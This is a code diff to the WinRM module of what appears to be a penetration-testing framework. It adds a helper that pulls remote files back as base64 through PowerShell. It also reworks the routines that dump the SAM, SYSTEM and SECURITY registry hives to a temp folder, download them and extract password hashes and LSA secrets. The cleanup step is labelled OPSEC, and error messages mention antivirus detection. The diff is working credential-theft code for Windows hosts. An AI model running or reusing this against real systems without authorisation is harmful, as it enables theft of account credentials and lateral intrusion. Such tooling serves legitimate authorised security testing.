@@ -505,6 +505,14 @@ class winrm(connection):
         command = payload if payload else self.args.ps_execute
         return self.execute(payload=command, get_output=get_output, shell_type="powershell")
 
+    def download_file(self, remote_path, local_path):
+        escaped = remote_path.replace("'", "''")
+        stdout, stderr, exit_code = self.run_command(f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{escaped}'))", "powershell")
+        if exit_code:
+            raise RuntimeError(stderr.strip().splitlines()[0])
+        with open(local_path, "wb") as fp:
+            fp.write(base64.b64decode("".join(stdout.split())))
+
     def get_file(self, remote_path=None, download_path=None):
         remote_path = remote_path if remote_path else self.args.get_file[0]
         local_path = download_path if download_path else self.args.get_file[1]
@@ -514,22 +522,10 @@ class winrm(connection):
 
         try:
             self.logger.display(f'Downloading "{remote_path}" to "{local_path}"')
-
-            escaped = remote_path.replace("'", "''")
-            data = self.ps_execute(f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{escaped}'))", True)
-
-            if not data:
-                raise RuntimeError("Remote file returned no data")
-
-            with open(local_path, "wb") as fp:
-                fp.write(base64.b64decode("".join(data.split())))
-
+            self.download_file(remote_path, local_path)
             self.logger.success(f"File {remote_path} has been saved to {local_path}")
-            return True
-
         except Exception as e:
             self.logger.fail(f"Failed to get file {remote_path}, error: {e!s}")
-            return False
 
     def put_file(self, local_path=None, remote_path=None):
         local_path = local_path if local_path else self.args.put_file[0]
@@ -573,23 +569,14 @@ class winrm(connection):
         output_filename = self.output_file_template.format(output_folder="sam")
 
         try:
-            output = self.execute(dump_command, get_output=True)
-
-            if output is None:
-                raise RuntimeError("Failed to execute SAM dump command")
-
-            if not self.get_file(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam"):
-                raise RuntimeError("Failed to download SAM hive")
-
-            if not self.get_file(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system"):
-                raise RuntimeError("Failed to download SYSTEM hive")
+            _, stderr, exit_code = self.run_command(dump_command if self.args.dump_method == "cmd" else f"cmd /c '{dump_command}'", self.args.dump_method)
+            if exit_code:
+                self.logger.fail(f"Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user: {stderr.strip()}")
+                return
+            self.download_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
+            self.download_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
         except Exception as e:
-            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
-                self.logger.fail("Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user")
-            elif hasattr(e, "code") and e.code == 5:
-                self.logger.fail(f"Dump SAM hashes with {self.args.dump_method} failed, please try '--dump-method'")
-            else:
-                self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
+            self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
         else:
             self.logger.display("Dumping SAM hashes")
             local_operations = LocalOperations(f"{output_filename}.system")
@@ -604,7 +591,7 @@ class winrm(connection):
             SAM.export(output_filename)
         finally:
             try:
-                self.execute(clean_command, get_output=True)
+                self.run_command(clean_command if self.args.dump_method == "cmd" else f"cmd /c '{clean_command}'", self.args.dump_method)
             except Exception as e:
                 self.logger.fail(f"[OPSEC] Cleanup command failed, check C:\\windows\\temp\\{sam_storename} and C:\\windows\\temp\\{system_storename}: {e}")
 
@@ -616,24 +603,14 @@ class winrm(connection):
         output_filename = self.output_file_template.format(output_folder="lsa")
 
         try:
-            output = self.execute(dump_command, get_output=True)
-
-            if output is None:
-                raise RuntimeError("Failed to execute LSA dump command")
-
-            if not self.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security"):
-                raise RuntimeError("Failed to download SECURITY hive")
-
-            if not self.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system"):
-                raise RuntimeError("Failed to download SYSTEM hive")
+            _, stderr, exit_code = self.run_command(dump_command if self.args.dump_method == "cmd" else f"cmd /c '{dump_command}'", self.args.dump_method)
+            if exit_code:
+                self.logger.fail(f"Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user: {stderr.strip()}")
+                return
+            self.download_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
+            self.download_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
         except Exception as e:
-            print(e)
-            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
-                self.logger.fail("Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user")
-            elif hasattr(e, "code") and e.code == 5:
-                self.logger.fail(f"Dump LSA secrets with {self.args.dump_method} failed, please try '--dump-method'")
-            else:
-                self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
+            self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
         else:
             if not quiet:
                 self.logger.display("Dumping LSA secrets")
@@ -661,7 +638,7 @@ class winrm(connection):
             LSA.dumpSecrets()
         finally:
             try:
-                self.execute(clean_command, get_output=True)
+                self.run_command(clean_command if self.args.dump_method == "cmd" else f"cmd /c '{clean_command}'", self.args.dump_method)
             except Exception as e:
                 self.logger.fail(f"[OPSEC] Cleanup command failed, check C:\\windows\\temp\\{security_storename} and C:\\windows\\temp\\{system_storename}: {e}")
 
